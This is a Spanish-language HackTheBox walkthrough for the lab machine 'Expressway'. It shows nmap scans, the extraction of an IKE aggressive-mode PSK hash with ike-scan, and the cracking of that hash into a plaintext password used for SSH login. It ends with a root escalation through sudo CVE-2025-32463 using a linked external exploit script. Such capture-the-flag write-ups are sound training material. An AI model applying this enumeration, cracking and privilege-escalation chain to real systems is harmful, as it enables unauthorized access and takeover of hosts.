---
title: Expressway - HTB
date: 2026-04-26
mermaid: true
categories: [HackTheBox, Linux, Easy]
image: 
  path: /assets/images/htb/expressway/logo.png
tags: [UDP, ipsec-ike]
---

---

## Enumeration

Vamos a empezar un escaneo `nmap`:

```bash
┌──(pylon㉿kali)-[~/Desktop/pylon/HTB]
└─$ nmap -p- --open -sS -n -Pn --min-rate=5000 10.129.19.153
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-20 22:53 CEST
Nmap scan report for 10.129.19.153
Host is up (0.045s latency).
Not shown: 62975 closed tcp ports (reset), 2559 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 12.53 seconds
```

Vemos que solo tiene el puerto `SSH` abierto, vamos a ver que versión corre en el:

```bash
┌──(pylon㉿kali)-[~/Desktop/pylon/HTB]
└─$ nmap -p22 -sV 10.129.19.153
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-20 22:55 CEST
Nmap scan report for 10.129.19.153
Host is up (0.044s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.50 seconds
```

Vemos que esta actualizado. No habiendo nada interesante por `TCP` vamos a buscar por `UDP`:

Para no hacer un escaneo eterno vamos a escanear un rango de `1-500` puertos:

```bash
┌──(pylon㉿kali)-[~/Desktop/pylon/HTB]
└─$ nmap -p1-500 --open -sU -n -Pn -T5 10.129.19.153
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-20 23:01 CEST
Warning: 10.129.19.153 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.129.19.153
Host is up (0.045s latency).
Not shown: 483 open|filtered udp ports (no-response), 16 closed udp ports (port-unreach)
PORT    STATE SERVICE
500/udp open  isakmp

Nmap done: 1 IP address (1 host up) scanned in 10.72 seconds
```

Vemos que el puerto `500` está abierto, vamos a realizar un escaneo para saber su versión:

```bash
┌──(pylon㉿kali)-[~/Desktop/pylon/HTB]
└─$ nmap -p500 -sCV -sU -n -Pn -T5 10.129.19.153
Nmap scan report for 10.129.19.153
Host is up (0.045s latency).

PORT    STATE SERVICE VERSION
500/udp open  isakmp?
| ike-version: 
|   attributes: 
|     XAUTH
|_    Dead Peer Detection v1.0
```

Vemos algo de `ike-version`, vamos a buscar información sobre este puerto:

> `IPsec` es una tecnología para asegurar las comunicaciones entre redes LAN → LAN desde usuarios remotos hasta la puerta de enlace red.
{: .prompt-info}

Buscando encontré lo siguiente para enumerar este servicio:

- [https://www.verylazytech.com/network-pentesting/ipsec-ike-vpn-port-500-udp](https://www.verylazytech.com/network-pentesting/ipsec-ike-vpn-port-500-udp)

## Shell as ike

Con la herramienta `ike-scan` vamos a extraer el nombre del grupo de la VPN y el hash:

```bash
┌──(pylon㉿kali)-[~/Desktop/pylon/HTB]
└─$ ike-scan -A --pskcrack=hash 10.129.19.153
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.19.153   Aggressive Mode Handshake returned HDR=(CKY-R=5595e71e777046a0) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
f991007560ceded3a82f366ff9e93b272d4d7dcf8f222c956f703ede80cd41eda845e5307e3baecfc7007c336a7ef4983ba5bbab3f3bac90d41ee23cc1192d8fdd661aa2a0b36b0ccccde2aedf931d10d851686c281829eeb42cd524e8c49383720f8ea3cb45fd9bfc10bfb6694f8702d8a7ad6da4042d276b443a0a1357e401:f9b44450d2d5121778f84d679ebcfdbef836088b70d2b10f01cd34b2a1287a5c4fed738fb7ae7ac853900a046ee3a49aa3e19f42fe918370cc2b0b0654b7e7a1b80cc5740a4248b0b2f8912eee034af03554981edd7c5f8cdb0c0965f07c59f945e1ec412bd8528a936822a03d52eb462c7b6a26790e4277348bd543fdfd2c57:5595e71e777046a0:dc12e005c08bc015:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:fc0ef80c6cfd4a8bef337bee7d96e4bcd0a54639:cc8cd1b1c927d738880a8deffe8dbf8f3516af0b12a860c6012da94099addaa1:96bfb38b9ab92b59dfb16747f7ddda93fe32e1df
Ending ike-scan 1.9.6: 1 hosts scanned in 0.057 seconds (17.66 hosts/sec).  1 returned handshake; 0 returned notify
```

Obtuvimos el hash y el nombre del grupo VPN:

**hash:**

```
f991007560ceded3a82f366ff9e93b272d4d7dcf8f222c956f703ede80cd41eda845e5307e3baecfc7007c336a7ef4983ba5bbab3f3bac90d41ee23cc1192d8fdd661aa2a0b36b0ccccde2aedf931d10d851686c281829eeb42cd524e8c49383720f8ea3cb45fd9bfc10bfb6694f8702d8a7ad6da4042d276b443a0a1357e401:f9b44450d2d5121778f84d679ebcfdbef836088b70d2b10f01cd34b2a1287a5c4fed738fb7ae7ac853900a046ee3a49aa3e19f42fe918370cc2b0b0654b7e7a1b80cc5740a4248b0b2f8912eee034af03554981edd7c5f8cdb0c0965f07c59f945e1ec412bd8528a936822a03d52eb462c7b6a26790e4277348bd543fdfd2c57:5595e71e777046a0:dc12e005c08bc015:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:fc0ef80c6cfd4a8bef337bee7d96e4bcd0a54639:cc8cd1b1c927d738880a8deffe8dbf8f3516af0b12a860c6012da94099addaa1:96bfb38b9ab92b59dfb16747f7ddda93fe32e1df
```

**VPN Group:**

```bash
ike@expressway.htb
```

Ahora si hacemos un `ls` veremos que nos creo un archivo llamado hash con el `hash` correspondiente. Vamos a crackearlo con `psk-crack`:

```bash
┌──(pylon㉿kali)-[~/Desktop/pylon/HTB]
└─$ psk-crack -d /usr/share/wordlists/rockyou.txt hash 
Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash 2df4d4b5c2dbd1fcc93da71088cf1ea450f31f21
Ending psk-crack: 8045040 iterations in 3.479 seconds (2312458.93 iterations/sec)
```

Vamos a probar esas credenciales como el usuario `ike` por `SSH`:

```bash
┌──(pylon㉿kali)-[~/Desktop/pylon/HTB]
└─$ ssh ike@10.129.19.153
ike@10.129.19.153's password: 
Last login: Wed Sep 17 12:19:40 BST 2025 from 10.10.14.64 on ssh
Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Sep 20 22:49:08 2025 from 10.10.14.115
ike@expressway:~$
```

## Shell as root

Si hacemos un `sudo -V` veremos la version de `sudo`:

```bash
ike@expressway:~$ sudo -V
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.17
```

La versión de `sudo` del servidor es la `1.9.17`, si buscamos esta versión encontraremos el siguiente CVE:

- [https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2025-32463](https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2025-32463)

Vamos a explotarlo con el siguiente exploit:

- [https://raw.githubusercontent.com/nflatrea/CVE-2025-32463/refs/heads/main/bipboop.sh](https://raw.githubusercontent.com/nflatrea/CVE-2025-32463/refs/heads/main/bipboop.sh)

```bash
ike@expressway:/tmp$ ./bipboop.sh 
Bip boop ! You now root !
root@expressway:/# 
```

---